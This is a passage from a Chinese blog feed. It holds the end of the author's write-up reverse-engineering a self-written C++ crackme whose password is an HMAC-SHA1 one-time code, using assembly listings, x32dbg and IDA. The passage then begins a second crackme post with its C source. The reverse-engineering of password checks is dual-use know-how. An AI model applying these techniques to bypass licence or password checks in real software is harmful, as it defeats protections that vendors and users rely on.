&lt;span class="err">0&lt;/span>&lt;span class="nf">x00406475&lt;/span> &lt;span class="mi">51&lt;/span> &lt;span class="no">push&lt;/span> &lt;span class="no">ecx&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x00406476&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="no">b&lt;/span> &lt;span class="no">c8&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x00406478&lt;/span> &lt;span class="no">ff&lt;/span> &lt;span class="mi">15&lt;/span> &lt;span class="no">d4&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">41&lt;/span> &lt;span class="mi">00&lt;/span> &lt;span class="no">call&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">public&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="no">bool&lt;/span> &lt;span class="no">__thiscall&lt;/span> &lt;span class="no">wxString&lt;/span>&lt;span class="p">::&lt;/span>&lt;span class="no">IsSameAs&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="no">class&lt;/span> &lt;span class="no">wxString&lt;/span> &lt;span class="no">const&lt;/span> &lt;span class="err">&amp;amp;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">bool&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="no">const&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; 0x4133d4
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>把&lt;code>eax&lt;/code>当成了&lt;code>this&lt;/code>，暂且不看栈上的&lt;code>ebp-0x70&lt;/code>，看到&lt;code>eax&lt;/code>立刻就发现是来自第四个比较迷惑的函数调用，实锤这函数就是生成密码的函数。&lt;/p>
&lt;h2 id="动态调试">动态调试&lt;/h2>
&lt;p>水平有限，静态分析很快遇到了瓶颈，找不出这个偏移值算出来的函数到底在哪儿。&lt;/p>
&lt;p>于是启动调试器，先跟到我们定位到的这个特殊函数。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-03/05.png"
loading="lazy"
alt="image-20210923140108796"
>&lt;/p>
&lt;p>惊喜地发现胡乱分析出现了错误，&lt;code>eax+0x40&lt;/code>其实是获取输入框值的函数。。所以另一个参数，&lt;code>ebp-0x70&lt;/code>才是密码。&lt;/p>
&lt;p>往回看&lt;code>ebp-0x70&lt;/code>在&lt;code>DoFormatWchar&lt;/code>被当参数传递了进去，要注意的是&lt;code>DoFormatWchar&lt;/code>是一个有变长参数的函数，这意味着你没法得知传了几个参数（前面push的内容不一定是当参数传了），分析更困难。&lt;/p>
&lt;p>看一下&lt;code>DoFormatWchar&lt;/code>这段汇编。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="err">0&lt;/span>&lt;span class="nf">x0040642c&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="no">d&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="no">d&lt;/span> &lt;span class="mi">70&lt;/span> &lt;span class="no">ff&lt;/span> &lt;span class="no">ff&lt;/span> &lt;span class="no">ff&lt;/span> &lt;span class="no">lea&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp&lt;/span> &lt;span class="p">-&lt;/span> &lt;span class="mi">0x90&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x00406432&lt;/span> &lt;span class="no">ff&lt;/span> &lt;span class="mi">15&lt;/span> &lt;span class="no">e8&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">41&lt;/span> &lt;span class="mi">00&lt;/span> &lt;span class="no">call&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">private&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="no">wchar_t&lt;/span> &lt;span class="no">const&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="no">__thiscall&lt;/span> &lt;span class="no">wxFormatString&lt;/span>&lt;span class="p">::&lt;/span>&lt;span class="no">AsWChar&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="no">void&lt;/span>&lt;span class="p">)]&lt;/span> &lt;span class="c">; 0x4133e8
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="mi">0x00406438&lt;/span> &lt;span class="mi">56&lt;/span> &lt;span class="no">push&lt;/span> &lt;span class="no">esi&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x00406439&lt;/span> &lt;span class="mi">50&lt;/span> &lt;span class="no">push&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x0040643a&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="no">d&lt;/span> &lt;span class="mi">45&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="no">lea&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp&lt;/span> &lt;span class="p">-&lt;/span> &lt;span class="mi">0x70&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x0040643d&lt;/span> &lt;span class="mi">50&lt;/span> &lt;span class="no">push&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x0040643e&lt;/span> &lt;span class="no">ff&lt;/span> &lt;span class="mi">15&lt;/span> &lt;span class="no">d0&lt;/span> &lt;span class="mi">33&lt;/span> &lt;span class="mi">41&lt;/span> &lt;span class="mi">00&lt;/span> &lt;span class="no">call&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">private&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="no">static&lt;/span> &lt;span class="no">class&lt;/span> &lt;span class="no">wxString&lt;/span> &lt;span class="no">__cdecl&lt;/span> &lt;span class="no">wxString&lt;/span>&lt;span class="p">::&lt;/span>&lt;span class="no">DoFormatWchar&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="no">wchar_t&lt;/span> &lt;span class="no">const&lt;/span> &lt;span class="p">*)]&lt;/span> &lt;span class="c">; 0x4133d0
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>一共推了三个东西入栈，esi、eax（上一个调用的返回值）、还有&lt;code>[ebp-0x70]&lt;/code>。&lt;/p>
&lt;p>继续调试器跟一遍看看。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-03/06.png"
loading="lazy"
alt="image-20210923142010900"
>&lt;/p>
&lt;p>&lt;code>esi&lt;/code>的值比较怪，先忽略。&lt;/p>
&lt;p>&lt;code>eax&lt;/code>比较清楚，宽字符串&lt;code>%06d&lt;/code>，按压栈顺序，&lt;code>esi&lt;/code>的值是紧跟在格式化字符串后面的参数。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-03/07.png"
loading="lazy"
alt="image-20210923142347785"
>&lt;/p>
&lt;p>最后压栈的eax，也就是ebp-0x70的地址，用伪代码表示就是：&lt;code>DoFormatWchar(&amp;amp;var_70, L&amp;quot;%06d&amp;quot;, 0x000F18D8)&lt;/code>。PS：有点怪，函数签名最左侧是format也就是格式化字符串，最后压栈这个ebp-0x70就有点莫名其妙。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-03/08.png"
loading="lazy"
alt="image-20210923143534148"
>&lt;/p>
&lt;p>不过用调试器单步步过后就知道用途了，和猜测的一样，存放的是格式化的结果，也就是正确的密码。&lt;/p>
&lt;p>既然如此，往回找esi是哪儿赋值的，因为inline了一大堆东西，Cutter连函数都认不出来了，控制流视图也挂了。。一直往上翻，找到&lt;code>0xcc&lt;/code>或者&lt;code>push ebp; mov ebp, esp&lt;/code>为止。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-03/09.png"
loading="lazy"
alt="image-20210923145922049"
>&lt;/p>
&lt;p>右键选择在此处定义函数，随便给个名字，然后等Cutter分析好函数体。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-03/10.png"
loading="lazy"
alt="image-20210923150100196"
>&lt;/p>
&lt;p>这样一来至少图形视图就能看了。粗略扫一眼，在底下找到&lt;code>IsSameAs&lt;/code>这个调用，再往回翻哪儿动了&lt;code>esi&lt;/code>这个寄存器，很快找到这两段。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-03/11.png"
loading="lazy"
alt="image-20210923150438821"
>&lt;/p>
&lt;p>有点杂，先看看。还是粗略按意图把指令分下段。&lt;code>esi&lt;/code>来源涉及&lt;code>eax&lt;/code>和&lt;code>ecx&lt;/code>，一路跟着赋值路径往回翻到第一个块，找到&lt;code>ecx&lt;/code>的赋值。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="err">0&lt;/span>&lt;span class="nf">x004062f1&lt;/span> &lt;span class="no">e8&lt;/span> &lt;span class="mi">68&lt;/span> &lt;span class="no">b3&lt;/span> &lt;span class="no">ff&lt;/span> &lt;span class="no">ff&lt;/span> &lt;span class="no">call&lt;/span> &lt;span class="no">fcn.0040165e&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x004062f6&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="no">b&lt;/span> &lt;span class="mi">08&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>一个未知函数，ctrl+左键点击跟进去后发现疑似是 libcrypto 内联的函数，调用了 HMAC-SHA1 算法。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-03/12.png"
loading="lazy"
alt="image-20210924092624224"
>&lt;/p>
&lt;p>先做个标记，猜测假设这个函数正确返回（下面的je跳转走到最后一个块），那返回结果应该是HMAC-SHA1的结果。这里通过调试器单步验证。&lt;/p>
&lt;p>因为 ASLR 的缘故，可执行文件 .text 段映射的地址不是 0x00401000，调试器没法直接转到静态分析工具中的地址，ASLR 确实折磨人&amp;hellip;&lt;/p>
&lt;p>anyway&amp;hellip;&lt;/p>
&lt;p>我投翔，特立独行是没好结果的，跑去下载了一个 IDA Free ，打开x32dbg确认 .text 段映射的基址后再到 IDA 的菜单 &lt;code>Edit&lt;/code> -&amp;gt; &lt;code>Segments&lt;/code> -&amp;gt; &lt;code>rebase program ...&lt;/code> 重新设定镜像基址，这样在反汇编界面看到的地址就能和调试器对上了。缺陷是每次打开调试器都要对一次镜像基址，比较麻烦。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-03/image-20210924154631893.png"
loading="lazy"
alt="image-20210924154631893"
>&lt;/p>
&lt;p>对好镜像基址后，把之前想调试的函数调用地址找到（0x003B62F1），下个断点，看调用后的&lt;code>eax&lt;/code>值，发现并不像纯c编译出来的结果，&lt;code>eax&lt;/code>并没有什么卵用。&lt;/p>
&lt;p>稍微往上瞟了一眼，很容易看到一个&lt;code>mov ecx,esi&lt;/code>，但没什么卵用。&lt;/p>
&lt;p>碰壁几次后决定跟进这个函数看看。无果。恼，作弊之（读过RFC可能注意到几个特殊常量，比如取哈希结果下标19，与0xf，作为偏移值向后再取4字节，作为bin code。跳过这个函数调用，直接看接下来的内容的话，会发现哈希值其实就存在&lt;code>ecx&lt;/code>保存的地址上了。）&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-03/image-20210924162043275.png"
loading="lazy"
alt="image-20210924162043275"
>&lt;/p>
&lt;p>只是这里的HMAC_SHA1值因为不是我们熟悉的ASCII表示，所以一眼有点难看出来。&lt;/p>
&lt;p>那么直接跳过上面不清不楚的地方，直接看取哈希后的做法。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nl">.text:&lt;/span>&lt;span class="err">003&lt;/span>&lt;span class="nf">B6307&lt;/span> &lt;span class="no">movzx&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">byte&lt;/span> &lt;span class="no">ptr&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ecx&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nl">.text:&lt;/span>&lt;span class="err">003&lt;/span>&lt;span class="nf">B630B&lt;/span> &lt;span class="no">and&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="no">Fh&lt;/span> &lt;span class="c">; 取 hash[19] &amp;amp; 0xf 作为初始偏移
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">.text&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">003&lt;/span>&lt;span class="no">B630E&lt;/span> &lt;span class="no">add&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;span class="nl">.text:&lt;/span>&lt;span class="err">003&lt;/span>&lt;span class="nf">B6310&lt;/span> &lt;span class="no">movzx&lt;/span> &lt;span class="no">esi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">byte&lt;/span> &lt;span class="no">ptr&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ecx&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; 取偏移处第一个字节，无符号
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">.text&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">003&lt;/span>&lt;span class="no">B6313&lt;/span> &lt;span class="no">movzx&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">byte&lt;/span> &lt;span class="no">ptr&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ecx&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c">; 取偏移处第二个字节，无符号
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">.text&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">003&lt;/span>&lt;span class="no">B6317&lt;/span> &lt;span class="no">and&lt;/span> &lt;span class="no">esi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">7&lt;/span>&lt;span class="no">Fh&lt;/span> &lt;span class="c">; 偏移处第一个字节 &amp;amp; 0x7f ，确保符号位归零
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">.text&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">003&lt;/span>&lt;span class="no">B631A&lt;/span> &lt;span class="no">shl&lt;/span> &lt;span class="no">esi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span> &lt;span class="c">; 第一个字节左移8位后 | 第二个字节，就是把四个字节按顺序填进esi
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">.text&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">003&lt;/span>&lt;span class="no">B631D&lt;/span> &lt;span class="no">or&lt;/span> &lt;span class="no">esi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;span class="nl">.text:&lt;/span>&lt;span class="err">003&lt;/span>&lt;span class="nf">B631F&lt;/span> &lt;span class="no">movzx&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">byte&lt;/span> &lt;span class="no">ptr&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ecx&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nl">.text:&lt;/span>&lt;span class="err">003&lt;/span>&lt;span class="nf">B6323&lt;/span> &lt;span class="no">shl&lt;/span> &lt;span class="no">esi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>
&lt;span class="nl">.text:&lt;/span>&lt;span class="err">003&lt;/span>&lt;span class="nf">B6326&lt;/span> &lt;span class="no">or&lt;/span> &lt;span class="no">esi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;span class="nl">.text:&lt;/span>&lt;span class="err">003&lt;/span>&lt;span class="nf">B6328&lt;/span> &lt;span class="no">movzx&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">byte&lt;/span> &lt;span class="no">ptr&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ecx&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nl">.text:&lt;/span>&lt;span class="err">003&lt;/span>&lt;span class="nf">B632C&lt;/span> &lt;span class="no">shl&lt;/span> &lt;span class="no">esi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>取得的就是4字节正整数了，按RFC的例子，接下来应该取模得到最大6位整数。看下一块汇编。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nl">.text:&lt;/span>&lt;span class="err">003&lt;/span>&lt;span class="nf">B6331&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="no">Block&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nl">.text:&lt;/span>&lt;span class="err">003&lt;/span>&lt;span class="nf">B6334&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">431&lt;/span>&lt;span class="no">BDE83h&lt;/span> &lt;span class="c">; magic ?
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">.text&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">003&lt;/span>&lt;span class="no">B6339&lt;/span> &lt;span class="no">imul&lt;/span> &lt;span class="no">esi&lt;/span>
&lt;span class="nl">.text:&lt;/span>&lt;span class="err">003&lt;/span>&lt;span class="nf">B633B&lt;/span> &lt;span class="no">sar&lt;/span> &lt;span class="no">edx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">12&lt;/span>&lt;span class="no">h&lt;/span>
&lt;span class="nl">.text:&lt;/span>&lt;span class="err">003&lt;/span>&lt;span class="nf">B633E&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">edx&lt;/span>
&lt;span class="nl">.text:&lt;/span>&lt;span class="err">003&lt;/span>&lt;span class="nf">B6340&lt;/span> &lt;span class="no">shr&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="no">Fh&lt;/span>
&lt;span class="nl">.text:&lt;/span>&lt;span class="err">003&lt;/span>&lt;span class="nf">B6343&lt;/span> &lt;span class="no">add&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">edx&lt;/span>
&lt;span class="nl">.text:&lt;/span>&lt;span class="err">003&lt;/span>&lt;span class="nf">B6345&lt;/span> &lt;span class="no">imul&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="no">F4240h&lt;/span>
&lt;span class="nl">.text:&lt;/span>&lt;span class="err">003&lt;/span>&lt;span class="nf">B634B&lt;/span> &lt;span class="no">sub&lt;/span> &lt;span class="no">esi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;span class="nl">.text:&lt;/span>&lt;span class="err">003&lt;/span>&lt;span class="nf">B634D&lt;/span> &lt;span class="no">test&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ecx&lt;/span>
&lt;span class="nl">.text:&lt;/span>&lt;span class="err">003&lt;/span>&lt;span class="nf">B634F&lt;/span> &lt;span class="no">jz&lt;/span> &lt;span class="no">short&lt;/span> &lt;span class="no">loc_3B638F&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>431BDE83h&lt;/code> 这个魔术常量吓到我了。搜了一下找到篇&lt;a class="link" href="https://bbs.pediy.com/thread-100189.htm" target="_blank" rel="noopener"
>看雪的帖子&lt;/a>，看起来是编译器把一句&lt;code>%1000000&lt;/code>取模给编译成了上面这一串满是魔数的汇编。尝试跟到 &lt;code>sub esi,eax&lt;/code> 后，&lt;code>esi&lt;/code> 寄存器的结果的确变成了6位以内的整数。&lt;/p>
&lt;p>这玩意儿有什么特征吗？总不至于多做几次取模，生成的汇编就完全没法看了吧。。。&lt;/p>
&lt;h2 id="keygen">keygen？&lt;/h2>
&lt;p>实力有限，尽管亲手写下的C++代码真的很简单，但编译后的结果成了无法承受之重&amp;hellip;&lt;/p>
&lt;p>上面分析的内容，其实仔细对着RFC推敲（首先，你得知道是照着RFC写的，不然就多读几遍汇编&amp;hellip;），才能很勉强得到个粗糙的算法，至于能不能写出 keygen，我没啥信心。&lt;/p>
&lt;h2 id="结论">结论&lt;/h2>
&lt;p>很难。&lt;/p>
&lt;p>如果说前面的 C 代码是小游戏的话，那 cm03 就是地球online。开启优化的C++无间地狱。&lt;/p>
&lt;p>完全溃败。&lt;/p></description></item><item><title>自娱自乐 crackme-02</title><link>https://nnnewb.github.io/blog/p/crackme-02/</link><pubDate>Wed, 15 Sep 2021 15:43:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/crackme-02/</guid><description>&lt;h2 id="得有个前言">得有个前言&lt;/h2>
&lt;p>总之上一个 crackme-01 还过得去，稍微加强一点，把密码隐藏起来，不要随便被看到。&lt;/p>
&lt;h2 id="0x01-源码">0x01 源码&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="n">size_t&lt;/span> &lt;span class="nf">getline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">lineptr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">n&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">FILE&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">stream&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">bufptr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">bufptr&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">size_t&lt;/span> &lt;span class="n">size&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">lineptr&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">stream&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">n&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">bufptr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">lineptr&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">n&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fgetc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stream&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">EOF&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">bufptr&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">bufptr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">malloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">128&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">bufptr&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">128&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">bufptr&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">EOF&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">p&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">bufptr&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">size&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">size&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">128&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">bufptr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">realloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bufptr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">bufptr&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="p">;&lt;/span>
